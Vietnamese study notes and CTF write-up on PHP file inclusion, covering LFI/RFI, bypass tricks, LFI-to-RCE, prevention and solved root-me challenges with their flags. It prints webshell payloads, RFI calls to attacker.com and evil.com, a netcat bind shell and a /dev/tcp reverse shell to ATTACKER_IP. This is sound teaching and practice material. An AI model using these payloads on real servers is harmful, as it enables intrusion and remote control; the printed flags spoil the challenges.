# Task 6

Text: Task 6:
- Tìm hiểu về lỗ hổng File Inclusion, phân loại.
- Tìm hiểu cách hoạt động của các hàm include, require, include_once, require_once trong PHP.
- Tìm hiểu về các kĩ thuật bypass file inclusion sau: Null Byte, Double Encoding, UTF-8 Encoding, Path Truncation, Filter Bypass, Bypass allow_url_include.
- Phân biệt lỗ hổng File Inclusion và Path Traversal.
- Tìm hiểu cách hoạt động của một số php wrapper trong khai thác file inclusion
- Tìm nhiều nhất những case LFI2Rce -> demo.
- Phân biệt Reverse Shell và Bind Shell và sử dụng chúng trong bước cuối sau khi rce thành công.
- Cách ngăn chặn file inclusion
- Xây dựng lab tấn công demo cả 2 loại File Inclusion
- Làm root-me: Directory traversal, Local File Inclusion, Local File Inclusion - Double encoding, Remote File Inclusion

DEADLINE: 23h 22/8

# I. Tìm hiểu về lỗ hổng File Inclusion, phân loại.

## 1. Khái niệm

- File Inclusion (FI) là một lỗ hổng bảo mật trong ứng dụng web, xảy ra khi ứng dụng cho phép người dùng chỉ định tập tin (file) để nạp (include/require) mà không kiểm soát hoặc lọc dữ liệu đầu vào.
- Hậu quả là kẻ tấn công có thể chèn vào các file ngoài ý muốn:
    - File nội bộ của hệ thống.
    - File độc hại từ bên ngoài.

## 2. Phân loại chính

### 2.1. Local file inclusion (LFI)

- Ứng dụng cho phép nạp file cục bộ ( trên cùng server)
- Thường kết hợp **directory traversal (`../`)** để truy cập ngoài thư mục cho phép.
ví dụ code:
    
    ```php
    <?php
      $page = $_GET['page']; // lấy giá trị từ tham số page trên url
      include($page); // không có kiểm soát input
    ?>
    ```
    

Khai thác: 

```php
http://victim.com/index.php?page=../../../../etc/passwd
```

Kết quả**:** file `/etc/passwd` (Linux) được hiển thị.

### 2.2. Remote File Inclusion (RFI)

- Ứng dụng nạp file từ máy chủ bên ngoài (qua URL).
- Điều kiện: PHP phải bật `allow_url_fopen` hoặc `allow_url_include`.

**Ví dụ code:**

```php
<?php
  $page = $_GET['page'];
  include($page);
?>
```

**Khai thác:**

```
http://victim.com/index.php?page=http://attacker.com/shell.txt
```

Trong đó `shell.txt` chứa payload PHP, ví dụ:

```php
<?php system($_GET['cmd']); ?>
```

Sau đó attacker có thể chạy:

```
http://victim.com/index.php?page=http://attacker.com/shell.txt&cmd=ls
```

# II. Tìm hiểu cách hoạt động của các hàm include, require, include_once, require_once trong PHP.

## 1. Hàm `include`

- Chức năng: nạp (include) nội dung của file chỉ định vào chương trình tại đúng vị trí gọi.
- Cách hoạt động:
    1. PHP mở file.
    2. Đọc nội dung.
    3. Đưa nội dung đó vào script.
    4. Nếu trong file có PHP code → thực thi. Nếu chỉ có text → in ra màn hình.
- Nếu file không tồn tại: PHP phát ra Warning nhưng chương trình vẫn tiếp tục chạy.

**Ví dụ:**

```php
// file hello.php
<?php
echo "Hello from hello.php!";
?>

// file index.php
<?php
echo "Start<br>";
include("hello.php");
echo "<br>End";
```

 Kết quả:

```
Start
Hello from hello.php!
End
```

Nếu hello.php không tồn tại:

```
Warning: include(hello.php): failed to open stream...
Start
End
```

→ Script vẫn chạy tiếp.

## 2. Hàm `require`

- Giống `include`, nhưng nghiêm khắc hơn.
- Nếu file không tồn tại: PHP phát ra Fatal Error và dừng hẳn chương trình (không chạy tiếp được nữa).

Ví dụ**:**

```php
<?php
echo "Start<br>";
require("notfound.php");  // file không tồn tại
echo "<br>End"; // dòng này KHÔNG chạy
```

 Kết quả:

```
Start
Fatal error: require(): Failed opening required 'notfound.php'
```

Script dừng lại, không chạy tiếp.

## 3. Hàm `include_once`

- Hoạt động giống `include`, nhưng đảm bảo rằng chỉ nạp file một lần duy nhất.
- Nếu gọi nhiều lần cùng một file → PHP sẽ bỏ qua, không nạp lại nữa.
- Tác dụng: tránh lỗi “redeclare function/class” khi include nhiều lần.

Ví dụ:

```php
// file lib.php
<?php
function hello() {
    echo "Hello World!";
}
?>

// file index.php
<?php
include_once("lib.php");
include_once("lib.php"); // lần 2 sẽ bị bỏ qua
hello();
```

👉 Kết quả:

```
Hello World!
```

Không có lỗi trùng hàm.

## 4. Hàm `require_once`

- Giống `require`, nhưng chỉ nạp file một lần duy nhất.
- Nếu file không tồn tại → Fatal Error, dừng chương trình.
- Nếu file được gọi nhiều lần → PHP sẽ bỏ qua sau lần đầu tiên.

Ví dụ:

```php
<?php
require_once("lib.php");
require_once("lib.php"); // sẽ không bị nạp lần 2
hello();
```

# III.  Tìm hiểu về các kĩ thuật bypass file inclusion sau

## 1. **Null Byte Injection**

- Ý tưởng:
    
    Trước PHP 5.3.4, chuỗi trong C được kết thúc bằng ký tự `NULL` (`\x00`).
    
    Attacker chèn `%00` vào đường dẫn để cắt bỏ phần đuôi file mà dev gắn thêm.
    
- Ví dụ code:
    
    ```php
    $page = $_GET['page'] . ".php";
    include($page);
    ```
    
- Payload:
    
    ```
    http://victim.com/index.php?page=../../../../etc/passwd%00
    ```
    
    → PHP sẽ hiểu đường dẫn là `/etc/passwd` và bỏ qua `.php`.
    
- Lưu ý:
    
    Kỹ thuật này không còn dùng được trên PHP >= 5.3.4, nhưng trong CTF vẫn gặp.
    

## 2. Double Encoding

- Ý tưởng:
    
    Dev có thể lọc chuỗi `../` hoặc `/etc/passwd`, nhưng attacker dùng URL encode nhiều lần để bypass.
    
- Ví dụ:
    - `../` → `%2e%2e%2f` (URL encode 1 lần).
    - Encode 2 lần → `%252e%252e%252f`.
- Payload:
    
    ```
    http://victim.com/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
    ```
    
    → Server decode 2 lần thành `../../etc/passwd`.
    
- Encode 1 lần (`%2e%2e%2f`) → PHP nhận `../` ngay → lọc sẽ chặn.
- Encode 2 lần (`%252e%252e%252f`) → khi lọc kiểm tra, input chưa hiện `../` nên không bị chặn. Sau đó webserver/PHP decode thêm một bước mới ra `../`

## 3. UTF-8 Encoding / Overlong Encoding

- Ý tưởng:
    
    Trong UTF-8, một số ký tự có thể viết bằng nhiều byte khác nhau (overlong sequence).
    
    Có thể dùng để bypass bộ lọc không xử lý hết encoding.
    
- Ví dụ:
    - `/` có thể biểu diễn thành `%c0%af` hoặc `%e0%80%af`.
    - `../` có thể thành `%c0%ae%c0%ae%c0%af`.
- Payload:
    
    ```
    http://victim.com/index.php?page=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
    ```
    

## 4. Path Truncation

- Ý tưởng:
    
    Trên các phiên bản PHP cũ (< 5.3.0) và một số hệ thống file, có giới hạn độ dài tên file (thường 4096 ký tự).
    
    Nếu chuỗi quá dài → phần cuối sẽ bị cắt bỏ.
    
    Attacker thêm chuỗi dài (ví dụ `aaaa...`) để cắt mất hậu tố `.php` do dev thêm.
    
- Ví dụ code:
    
    ```php
    $page = $_GET['page'] . ".php";
    include($page);
    ```
    
- Payload:
    
    ```
    http://victim.com/index.php?page=../../../../etc/passwd/AAAAAAAAAA...(4096 ký tự)...
    ```
    
    → `.php` bị cắt bỏ và toàn bộ phần cuối là AAA.. cũng bị cắt bỏ → include `/etc/passwd`
    

## 5. Filter Bypass (PHP Wrappers)

- Trong PHP, **stream wrapper** là một cơ chế cho phép bạn truy cập tài nguyên (file, input, dữ liệu inline, …) thông qua **một giao thức (protocol)** đặc biệt, giống như cách bạn mở file bình thường.
    - Ví dụ, thay vì chỉ đọc file bằng đường dẫn `"file.txt"`, bạn có thể dùng `php://`, `data://`, `zip://`…
    - Chúng được PHP cung cấp sẵn, và xử lý bởi **hàm file I/O** (như `fopen`, `include`, `require`).
- Một số PHP Stream Wrapper thường gặp:
    - php://filter     → Cho phép áp dụng filter (chuyển đổi dữ liệu) trước khi đọc file.
    - php://input    → Cho phép đọc **raw data** từ body của HTTP request.
    - data://           → Cho phép truyền dữ liệu inline ngay trong URL
        - Cú pháp: `data://<mediatype>[;base64],<data>`
    - **zip://** và **phar://   →** Truy cập file bên trong archive `.zip` hoặc `.phar`
- Ý tưởng:
    
    Nếu dev chỉ cho phép file `.php`, attacker dùng PHP stream wrapper để lách.
    
- Kỹ thuật:
    - Đọc source code:
        
        ```
        ?page=php://filter/convert.base64-encode/resource=index.php
        ```
        
        - nếu đọc thẳng source code như `?page=index.php` thì sẽ chỉ thấy kết quả thực thi code, không thấy được code. Ta sẽ encode trước, khi mở sẽ ra toàn bộ source đã encode
        
        → Hiển thị mã nguồn `index.php` dạng base64.
        
    - Nhúng payload trực tiếp:
        
        ```
        ?page=data://text/plain,<?php system($_GET['cmd']); ?>
        ```
        
        → php sẽ đọc nội dung sau dấu `,` và thực thi php. Như vậy attacker có thể inject webshell trực tiếp trong URL, không cần upload file hay đặt file trên server khác.
        
    - Dùng archive:
        
        ```
        ?page=zip://shell.zip%23shell.php
        ```
        
        1. Attacker upload hoặc tìm cách đặt file `shell.zip` trên server.
        2. File `shell.zip` chứa `shell.php` với nội dung:
            
            ```php
            <?php system($_GET['cmd']); ?>
            ```
            
        3. Khi gọi `?page=zip://shell.zip%23shell.php`, PHP sẽ:
            - Mở `shell.zip`.
            - Lấy file `shell.php` bên trong.
            - Nạp nội dung như thể include file PHP bình thường.
        4. Payload được thực thi.
        
        → Đây là cách bypass khi server chỉ cho phép include file `.php` và cấm `../` hoặc URL remote.
        

## 6. Bypass allow_url_include

- Ý tưởng:
    
    Khi cấu hình `allow_url_include=Off`, dev nghĩ rằng attacker không thể RFI.
    
    Nhưng attacker vẫn có thể:
    
    - Dùng `php://input` để đưa code trong body request.
    - Dùng `data://` wrapper để đưa code inline.
- Ví dụ 1: php://input
    
    ```php
    <?php
    include("php://input");
    ?>
    ```
    
    Attacker gửi request POST:
    
    ```php
    POST /index.php?page=php://input
    Content-Type: text/plain
    
    <?php system($_GET['cmd']); ?>
    ```
    
    Lúc này, `include("php://input")` sẽ lấy nội dung `<?php system($_GET['cmd']); ?>` từ body 
    
    → thực thi như PHP code. Và muốn chạy hàm system đó thì phải thêm biến `&cmd=...` vào url 
    
- Ví dụ 2: data://
    
    ```
    ?page=data://text/plain,<?php system($_GET['cmd']); ?>
    ```
    

👉 Kết quả: vẫn RCE được dù `allow_url_include=Off`.

# IV. Phân biệt lỗ hổng File Inclusion và Path Traversal.

## **1. File Inclusion (FI)**

- **Định nghĩa:** Ứng dụng cho phép người dùng chỉ định file để nạp (`include`, `require` trong PHP).
- **Hậu quả:**
    - Đọc được file hệ thống (LFI).
    - Thực thi code từ xa (RFI).
    - Dẫn đến RCE nếu kết hợp kỹ thuật khác.
- **Ví dụ:**
    
    ```php
    <?php include($_GET['page']); ?>
    ```
    
    ```
    ?page=../../../../etc/passwd
    ?page=http://evil.com/shell.txt
    ```
    

## **2. Path Traversal (Directory Traversal)**

- **Định nghĩa:** Lỗ hổng cho phép người dùng truy cập file/thư mục ngoài phạm vi dự định bằng chuỗi `../`.
- **Hậu quả:** Chỉ dừng ở mức **đọc hoặc ghi file**, không thực thi code.
- **Ví dụ:**
    
    ```php
    <?php
    $file = $_GET['file'];
    echo file_get_contents("/var/www/html/uploads/" . $file);
    ?>
    ```
    
    ```
    ?file=../../../../etc/passwd
    ```
    

👉 **Khác biệt chính:**

- Path Traversal: đọc file → rò rỉ dữ liệu.
- File Inclusion: không chỉ đọc file mà **còn có thể thực thi code** nếu file chứa PHP payload.

# V. Các PHP Wrapper trong khai thác File Inclusion

| Wrapper | Công dụng chính | Payload mẫu |
| --- | --- | --- |
| **php://filter** | Đọc source code file, tránh thực thi | `?page=php://filter/convert.base64-encode/resource=index.php` |
| **php://input** | Thực thi code từ raw POST body | `?page=php://input` (body: `<?php system($_GET['cmd']); ?>`) |
| **data://** | Nhúng code inline trong URL | `?page=data://text/plain,<?php system($_GET['cmd']); ?>` |
| **zip://** | Include file trong archive .zip | `?page=zip://shell.zip%23shell.php` |
| **phar://** | Include file trong archive .phar (hay kết hợp unserialize) | `?page=phar://shell.phar/shell.php` |

# VI. Các case LFI2RCE (Local File Inclusion to Remote Code Execution)

## 1. Log Poisoning

- Ý tưởng: ghi payload PHP vào file log webserver, sau đó include file đó.
- Ví dụ Apache log:
    
    ```
    User-Agent: <?php system($_GET['cmd']); ?>
    ```
    
    - mỗi khi có request đến website, Apache đều ghi lại log vào file .
    - file ghi các yêu cầu truy cập thông thường được ghi vào `/var/log/apache2/access.log` trên linux.
- Payload:
    
    ```
    ?page=/var/log/apache2/access.log&cmd=id
    ```
    
- Kết quả: log file bị include, payload thực thi → RCE.

## 2. Session Poisoning

- Nếu PHP lưu session dạng file (`/tmp/sess_<id>`).
- Attacker sửa session, nhúng payload PHP vào.
- Sau đó include:
    
    ```
    ?page=/tmp/sess_abcd1234&cmd=ls
    ```
    

## 3. Wrapper Exploit

- **php://input**
    
    ```
    ?page=php://input
    ```
    
    Body:
    
    ```php
    <?php system($_GET['cmd']); ?>
    ```
    
- **data://**
    
    ```
    ?page=data://text/plain,<?php system($_GET['cmd']); ?>
    ```
    

→ Cả hai tạo webshell tạm thời, điều khiển server mà không cần upload file.

## 4. Reverse Shell vs Bind Shell

### a. Bind Shell

- Máy nạn nhân mở sẵn ip và port để attacker kết nối vào
- Trên máy nạn nhân (qua RCE) chạy:
    
    ```bash
    nc -lvnp 5555 -e /bin/bash
    ```
    
    → Máy nạn nhân mở cổng 5555 và gắn shell `/bin/bash`.
    
- Attacker từ máy mình kết nối vào:
    
    ```bash
    nc VICTIM_IP 5555
    ```
    
- Kết quả: attacker có shell từ xa.

### b. Reverse Shell

- Máy nạn nhân (server) sẽ kết nối ngược lại về máy attacker đã mở sẵn ip và port.
- Attacker trên máy mình mở listener:
    
    ```bash
    nc -lvnp 4444
    ```
    
- Từ webshell (RCE) trên nạn nhân chạy:
    
    ```bash
    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
    ```
    
- Server kết nối ngược về máy attacker → attacker có shell tương tác.

# VII. Các cách ngăn chặn file includsion

## 1. Không include trực tiếp từ input

- Chỉ include những file xác định trước.
- Sử dụng whitelist (danh sách cho phép).

## 2. Vô hiệu hóa RFI (Remote File Inclusion)

- Trong `php.ini`, đảm bảo:
    
    ```
    allow_url_fopen = Off
    allow_url_include = Off
    ```
    
- Điều này ngăn chặn attacker include URL từ xa như `http://evil.com/shell.txt`.

## 3. Chuẩn hóa và kiểm tra đường dẫn

- Dùng `realpath()` để lấy **đường dẫn tuyệt đối thực sự**.
- Kiểm tra xem nó có nằm trong thư mục cho phép không.

**Ví dụ:**

```php
<?php
$baseDir = "/var/www/html/pages/";
$file = realpath($baseDir . $_GET['page'] . ".php");

if ($file !== false && strpos($file, $baseDir) === 0) {
    include($file);
} else {
    include($baseDir . "error.php");
}
?>
```

→ Bảo đảm attacker không thể chèn `../` để thoát ra ngoài.

# VIII. Demo lab tấn công 2 loại file includsion

## 1. Local File include  (LFI)

```php
<?php
if(isset($_GET['page'])){
    $page = $_GET['page'];
    include($page);
}
else{
    echo "Hãy chỉ định tham số 'page'.";
}
```

![image.png](image.png)

![image.png](image%201.png)

## 2. Remote File Include (RFI)

- Để dùng được RFI thì ta phải bật `allow_url_include = Off`
- vào thư mục xampp/php/php.ini trên máy và sửa allow_url_include = Off thành allow_url_include = On
- page=[`https://gist.githubusercontent.com/phong1323/8e035c2fe6dbb2840c01699a6749a556/raw/f908fb3cd0b295d02a67f9ce3f702bd8a29e2427/gistfile1.txt`](https://gist.githubusercontent.com/phong1323/588c364bc3df4d828cb44e21eeaccd48/raw/d72837798d3ff96c9bacee3409f91a82618502c2/gistfile1.txt)

![image.png](image%202.png)

# IX. Lab trên Rootme

## **1. Directory traversal**

[http://challenge01.root-me.org/web-serveur/ch15/ch15.php](http://challenge01.root-me.org/web-serveur/ch15/ch15.php)

- ta thấy query với tham số `galeri` có thể là mở file hoặc thư mục lên để hiện ảnh
- thử galeri=`../` để lùi lên một cấp trên xem có gì không

![image.png](image%203.png)

có 2 ảnh gợi í 2 file là ch15.php và galerie

![image.png](image%204.png)

- ch15.php là file, không mở được bằng `opendir` chỉ để mở thư mục
- ta thử mở folder galerie bằng galerie=`../galerie`

![image.png](image%205.png)

xuất hiện thêm thư mục 86hwnX2r

- galerie=`../galerie/86hwnX2r`

![image.png](image%206.png)

có file password.txt nhưng vì không mở được file bằng url nên ta ấn thẳng vào link kia luôn

![image.png](image%207.png)

kcb$!Bx@v4Gs9Ez 

## 2. Local File

[http://challenge01.root-me.org/web-serveur/ch16/](http://challenge01.root-me.org/web-serveur/ch16/)

- sau một hồi thử thì thấy tham số `files` để chỉ định đường dẫn ta truy cập, tham số `f` chỉ định file để mở

![image.png](image%208.png)

- vì bên cạnh có guest | admin nên ta đoán có 2 thư mục người dùng là guest hoặc admin

![image.png](image%209.png)

- ta sẽ lùi lên một cấp rồi chuyển qua thư mục admin files=`../admin`

![image.png](image%2010.png)

thấy password của admin

## **3. Local File Inclusion - Double encoding**

[http://challenge01.root-me.org/web-serveur/ch45/](http://challenge01.root-me.org/web-serveur/ch45/)

- ta thấy web điều hướng sang các trang bằng tham số page, nó có thể là lỗi LFI/RFI
- sử dụng ../ để lùi lên thư mục trên của hệ thống

![image.png](image%2011.png)

- nhưng nó lại hiện attack detected nghĩa là các kí tự tấn công kia đã bị filter
- tôi encode bằng tool này [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
- page=`%252E%252E%252F`

![image.png](image%2012.png)

- đã bypass được filter nhưng xuất hiện lỗi
- ta sẽ sử dụng php wrappers để đọc source code
    
    page=`php://filter/convert.base64-encode/resource=home`
    
- sau khi double encode url thì được `php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dhome`
- trang web ra được source đã bị encode như này

`PD9waHAgaW5jbHVkZSgiY29uZi5pbmMucGhwIik7ID8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5KLiBTbWl0aCAtIEhvbWU8L3RpdGxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDw/PSAkY29uZlsnZ2xvYmFsX3N0eWxlJ10gPz4KICAgIDxuYXY+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWhvbWUiIGNsYXNzPSJhY3RpdmUiPkhvbWU8L2E+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWN2Ij5DVjwvYT4KICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9Y29udGFjdCI+Q29udGFjdDwvYT4KICAgIDwvbmF2PgogICAgPGRpdiBpZD0ibWFpbiI+CiAgICAgIDw/PSAkY29uZlsnaG9tZSddID8+CiAgICA8L2Rpdj4KICA8L2JvZHk+CjwvaHRtbD4K`

![image.png](image%2013.png)

- ta thấy nó có include file `conf.inc.php` rất có thể là file cấu hình chính
- trong file này cấu hình cả mảng `$conf` (kiểu associative array) với các tham số như `home`  `cv` `contack` để điều hướng trang. Tức là chỉ cần truyền vào tham số page là `home` là nó sẽ nối thêm `.inc.php`
- ta sẽ sử dụng lệnh trên để lấy source code của `conf.inc.php`
    
    page=`php://filter/convert.base64-encode/resource=conf`
    

→ url double encode thành 

`php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf`

- source code `PD9waHAKICAkY29uZiA9IFsKICAgICJmbGFnIiAgICAgICAgPT4gIlRoMXNJc1RoM0ZsNGchIiwKICAgICJob21lIiAgICAgICAgPT4gJzxoMj5XZWxjb21lPC9oMj4KICAgIDxkaXY+V2VsY29tZSBvbiBteSBwZXJzb25hbCB3ZWJzaXRlICE8L2Rpdj4nLAogICAgImN2IiAgICAgICAgICA9PiBbCiAgICAgICJnZW5kZXIiICAgICAgPT4gdHJ1ZSwKICAgICAgImJpcnRoIiAgICAgICA9PiA0NDE3NTk2MDAsCiAgICAgICJqb2JzIiAgICAgICAgPT4gWwogICAgICAgIFsKICAgICAgICAgICJ0aXRsZSIgICAgID0+ICJDb2ZmZWUgZGV2ZWxvcGVyIEBNZWdhdXBsb2FkIiwKICAgICAgICAgICJkYXRlIiAgICAgID0+ICIwMS8yMDEwIgogICAgICAgIF0sCiAgICAgICAgWwogICAgICAgICAgInRpdGxlIiAgICAgPT4gIkJlZCB0ZXN0ZXIgQFlvdXJNb20ncyIsCiAgICAgICAgICAiZGF0ZSIgICAgICA9PiAiMDMvMjAxMSIKICAgICAgICBdLAogICAgICAgIFsKICAgICAgICAgICJ0aXRsZSIgICAgID0+ICJCZWVyIGRyaW5rZXIgQE5lYXJlc3RCYXIiLAogICAgICAgICAgImRhdGUiICAgICAgPT4gIjEwLzIwMTQiCiAgICAgICAgXQogICAgICBdCiAgICBdLAogICAgImNvbnRhY3QiICAgICAgID0+IFsKICAgICAgImZpcnN0bmFtZSIgICAgID0+ICJKb2huIiwKICAgICAgImxhc3RuYW1lIiAgICAgID0+ICJTbWl0aCIsCiAgICAgICJwaG9uZSIgICAgICAgICA9PiAiMDEgMzMgNzEgMDAgMDEiLAogICAgICAibWFpbCIgICAgICAgICAgPT4gImpvaG4uc21pdGhAdGhlZ2FtZS5jb20iCiAgICBdLAogICAgImdsb2JhbF9zdHlsZSIgID0+ICc8c3R5bGUgbWVkaWE9InNjcmVlbiI+CiAgICAgIGJvZHl7CiAgICAgICAgYmFja2dyb3VuZDogcmdiKDIzMSwgMjMxLCAyMzEpOwogICAgICAgIGZvbnQtZmFtaWx5OiBUYWhvbWEsVmVyZGFuYSxTZWdvZSxzYW5zLXNlcmlmOwogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgfQogICAgICBkaXYjbWFpbnsKICAgICAgICBwYWRkaW5nOiAyMHB4IDEwcHg7CiAgICAgIH0KICAgICAgbmF2ewogICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHJnYigxMDEsIDEwMSwgMTAxKTsKICAgICAgICBmb250LXNpemU6IDA7CiAgICAgIH0KICAgICAgbmF2IGF7CiAgICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICAgIHBhZGRpbmc6IDVweCAxMHB4OwogICAgICAgIGJveC1zaXppbmc6IGJvcmRlci1ib3g7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgICBjb2xvcjogIzU1NTsKICAgICAgfQogICAgICBuYXYgYS5hY3RpdmV7CiAgICAgICAgY29sb3I6ICNmZmY7CiAgICAgICAgYmFja2dyb3VuZDogcmdiKDExOSwgMTM4LCAxNDQpOwogICAgICB9CiAgICAgIG5hdiBhOmhvdmVyewogICAgICAgIGNvbG9yOiAjZmZmOwogICAgICAgIGJhY2tncm91bmQ6IHJnYigxMTksIDEzOCwgMTQ0KTsKICAgICAgfQogICAgICBoMnsKICAgICAgICBtYXJnaW4tdG9wOjA7CiAgICAgIH0KICAgICAgPC9zdHlsZT4nCiAgXTsK`

```php
<?php
  $conf = [
    "flag"        => "Th1sIsTh3Fl4g!",
    "home"        => '<h2>Welcome</h2>
    <div>Welcome on my personal website !</div>',
    "cv"          => [
      "gender"      => true,
      "birth"       => 441759600,
      "jobs"        => [
        [
          "title"     => "Coffee developer @Megaupload",
          "date"      => "01/2010"
        ],
        [
          "title"     => "Bed tester @YourMom's",
          "date"      => "03/2011"
        ],
        [
          "title"     => "Beer drinker @NearestBar",
          "date"      => "10/2014"
        ]
      ]
    ],
    "contact"       => [
      "firstname"     => "John",
      "lastname"      => "Smith",
      "phone"         => "01 33 71 00 01",
      "mail"          => "john.smith@thegame.com"
    ],
    "global_style"  => '<style media="screen">
      body{
        background: rgb(231, 231, 231);
        font-family: Tahoma,Verdana,Segoe,sans-serif;
        font-size: 14px;
      }
      div#main{
        padding: 20px 10px;
      }
      nav{
        border: 1px solid rgb(101, 101, 101);
        font-size: 0;
      }
      nav a{
        font-size: 14px;
        padding: 5px 10px;
        box-sizing: border-box;
        display: inline-block;
        text-decoration: none;
        color: #555;
      }
      nav a.active{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      nav a:hover{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      h2{
        margin-top:0;
      }
      </style>'
  ];

```

flag 

![image.png](image%2014.png)

## **4. Remote File Inclusion**

[http://challenge01.root-me.org/web-serveur/ch13/](http://challenge01.root-me.org/web-serveur/ch13/)

- trang có tham số `lang` chuyển hướng web sang 2 trang ngôn ngữ khác nhau

![image.png](image%2015.png)

- thử lang=`../`

![image.png](image%2016.png)

- code đang dùng `include` và nó đã tự nối thêm đuôi `_lang.php`
- ta lại dùng `php://filter` để đọc source code

 lang=`php://filter/convert.base64-encode/resource=en`

![image.png](image%2017.png)

- thử sang source của [**Français](http://challenge01.root-me.org/web-serveur/ch13/?lang=fr) cũng như vậy không có gì**
- ta thử dùng RFI để đọc source của file `index.php`
- tạo shell bằng trang gist này [https://gist.github.com/](https://gist.github.com/)

[https://gist.githubusercontent.com/phong1323/9bd7c6f39b8880fd8b7e5667e81689fc/raw/aa78c8684d3daa9a20d99c2066a1bcc24691953f/shell_lang.php](https://gist.githubusercontent.com/phong1323/9bd7c6f39b8880fd8b7e5667e81689fc/raw/aa78c8684d3daa9a20d99c2066a1bcc24691953f/shell_lang.php)

- lang=`https://gist.githubusercontent.com/phong1323/9bd7c6f39b8880fd8b7e5667e81689fc/raw/aa78c8684d3daa9a20d99c2066a1bcc24691953f/shell` khi đó server sẽ tự thêm đuôi `_lang.php` vào

![image.png](image%2018.png)

R3m0t3_iS_r3aL1y_3v1l
